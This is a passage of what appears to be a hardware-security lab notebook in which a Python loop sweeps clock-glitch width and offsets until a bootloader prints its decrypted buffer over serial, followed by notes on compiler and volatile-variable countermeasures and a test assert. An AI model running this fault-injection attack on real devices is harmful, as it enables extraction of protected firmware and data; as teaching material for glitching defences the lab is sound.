      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x1F0xD50xAA0xBF0x030xBC0xBF0xAB0x9E0xDB0x040xF7k0xF4=-F0xD70xABij0xC20xB70x880xB00x0ESe8D0x9F0xD1QE0xA50xF20xA30xEE0x8A0x8B0xCD0xAA0xC1%0xD5y0x9FV0xCD0x9C0xD7~0xEAy0x990xFE.0xA10xD5WlE0xAA(0xB80xAAI0xB50x900x840x110xDD0xDE0xC9S0xA90xB20xA3'0xEE0x96h0x170xEDTl/u5m0xAB0xE90x1A%0xAE0xF50xAFi0x1E]0x150xFD0xBD:s0xB60xFB0x9A0xFA>0xAD0xFA0xE30xBA0xE7V0xD70xD9]t0x990xD70xB60x140x9A0xAB0xF1"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "8!f0xBF0xBD0x860xEE0xEE0x150x05g0xB50xC40x9F/0x980xA8z0x8B0x8C0xC30xE90xB90xAC0x05e0x190x800xD50xF10x9A0x19Wk0xEE0xFA0x940x920xE0,0x130x15T0x910xA90xA20xAE-\\!#0x05E0x0750xE7O0x02#0x8A0xF20x830x1A0x84X0x0Bu0xD4X0x140xD00x050x120x880xB8b0x080x0C0xB60x05BO0x1A0x95E0xC2V40x8E>0xDC0xAA0x1A0x180xDE!0x14T0x7F0xBDuu0x15Tzu/0x9E0x040xC00x140xFB0xE80xA8\n",
      "0xA30x850xA6i0xA60x0DDq0x130x850xFC`"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\\0x960xD10xACl0xAB0xB70x80(F0xB90xA9>0x070xD2PyU*e> 0xAA0xA0\\,Bu0x8E:0xE20xA90xEC\"0xE40x0EF0x14V0x050x85]0x000x1E0x88"
     ]
    }
   ],
   "source": [
    "from tqdm import tqdm_notebook, tnrange\n",
    "from collections import namedtuple\n",
    "\n",
    "target.init()\n",
    "reset_target(scope)\n",
    "print(\"Init\")\n",
    "broken = False\n",
    "N = 0\n",
    "\n",
    "#scope.glitch.width = width_range.min\n",
    "#while scope.glitch.width < width_range.max:\n",
    "for k in tnrange(0, 40, desc=\"width\"):\n",
    "    scope.glitch.width_fine = k\n",
    "    #scope.glitch.offset = offset_range.min\n",
    "    if broken:\n",
    "        break\n",
    "    #while scope.glitch.offset < offset_range.max:\n",
    "    for j in tnrange(0, 40, leave=False, desc=\"offset\"):\n",
    "        scope.glitch.offset_fine = j\n",
    "        if broken:\n",
    "            break\n",
    "        for i in tqdm_notebook(ext_range, leave=False, desc=\"ext_offset\"):\n",
    "            N += 1\n",
    "            if scope.adc.state:\n",
    "                #trigger never went low, target probably crashed\n",
    "                reset_target(scope)\n",
    "                #print(\"Crashed!\")\n",
    "\n",
    "            scope.glitch.ext_offset = i\n",
    "            scope.arm()\n",
    "\n",
    "            send_milk(target.ser)\n",
    "            while target.isDone() is False and timeout:\n",
    "                timeout -= 1\n",
    "                time.sleep(0.01)\n",
    "\n",
    "            try:\n",
    "                ret = scope.capture()\n",
    "                if ret:\n",
    "                    reset_target(scope)\n",
    "                    continue\n",
    "            except IOError as e:\n",
    "                logging.error('IOError: %s' % str(e))\n",
    "            \n",
    "            time.sleep(0.05)\n",
    "            waiting = target.ser.inWaiting()\n",
    "            output = target.ser.read(waiting, timeout=2)\n",
    "\n",
    "            #check if we were successful\n",
    "            if \"7\" in output:\n",
    "                print(\"Glitched!\\n\\tExt offset: {}\\n\\tOffset: {}\\n\\tWidth: {}\".format(i, scope.glitch.offset, scope.glitch.width))\n",
    "                my_print(output)\n",
    "                broken = True \n",
    "                for __ in range(500):\n",
    "                    waiting = target.ser.inWaiting()\n",
    "                    if waiting:\n",
    "                        output = target.ser.read(waiting, timeout=50)\n",
    "                        my_print(output)\n",
    "                time.sleep(10)\n",
    "                break\n",
    "\n",
    "            if scope.adc.state:\n",
    "                #trigger never went low, target probably crashed\n",
    "                reset_target(scope)\n",
    "                #print(\"Crashed! Output: {}\".format(output))\n",
    "                \n",
    "        #scope.glitch.offset += offset_range.step\n",
    "    #scope.glitch.width += width_range.step\n",
    "    \n",
    "#"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "With any luck, you should see a whole bunch of text printed to the screen. Successful glitches might not happen every time, so you may need to rerun the loop a few times.\n",
    "\n",
    "You should be able to the plaintext near the beginning of the output! The data buffer has successfully been printed to the serial port, allowing us to see the decrypted text with no knowledge of the algorithm. Now that we've got a successful glitch, stop the cell above (since it's still looking for more stuff to print) and let's disconnect the scope and target:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Ideas"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "There's a lot more that can be done with this type of attack..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Safer Assembly Code"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You may have been surprised to see that the assembly code uses a `brne` instruction to check if the loop is finished - after all, we used a less-than comparison in our C source code! Try changing this line to use a more prohibitive loop. Here's how you might do this:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Volatile Variables"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The reason why the original assembly code used the brne instruction is because GCC is an *optimizing compiler*. The compiler doesn't directly translate the C source code into assembly instructions. Instead, it tries to determine if any of the code can be modified to make it faster or more compact. For instance, consider the loop:\n",
    "\n",
    "```C\n",
    "for(int i = 0; i < 10; i++)\n",
    "{\n",
    "    if(i < 20)\n",
    "        printf(\"%s\", \"Less\");\n",
    "    else\n",
    "        printf(\"%s\", \"Greater\");\n",
    "}\n",
    "```\n",
    "\n",
    "If you take a careful look at this code, you'll notice that the following loop will produce the same output:\n",
    "\n",
    "```C\n",
    "for(int i = 0; i < 10; i++)\n",
    "{\n",
    "    printf(\"%s\", \"Less\");\n",
    "}\n",
    "```\n",
    "\n",
    "However, this second loop is smaller (less code) and faster (no conditional jumps). This is the kind of optimization a compiler can make.\n",
    "\n",
    "There are several ways we can stop the compiler from making some of these assumptions. One of these methods uses volatile variables, which look like\n",
    "\n",
    "```C\n",
    "volatile int i;\n",
    "```\n",
    "\n",
    "A volatile variable is one that could change at any time. There could be many reasons why the value might change on us:\n",
    "\n",
    "* Another thread might have access to the same memory location\n",
    "* Another part of the computer might be able to change the variable's value (example: direct memory access)\n",
    "* The variable might not actually be stored anywhere - it could be a read-only register in an embedded system\n",
    "\n",
    "In any case, the `volatile` keyword tells the compiler to make no guarantees about this variable.\n",
    "\n",
    "Try changing the bootloader's source code to use a volatile variable inside the loop. What happens to the disassembly? Is the loop body longer? Connect to the target board and capture a power trace. Does it look different? You'll have to find a new *Ext Trigger Offset* for the glitch module. Can you still perform the attack? Is it feasible to use this fix to avoid glitching attacks?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "assert (broken == True), \"Failed to break bootloader in {} glitches\".format(N)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {
    "height": "calc(100% - 180px)",
    "left": "10px",
    "top": "150px",
    "width": "384px"
   },
   "toc_section_display": true,
   "toc_window_display": true
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
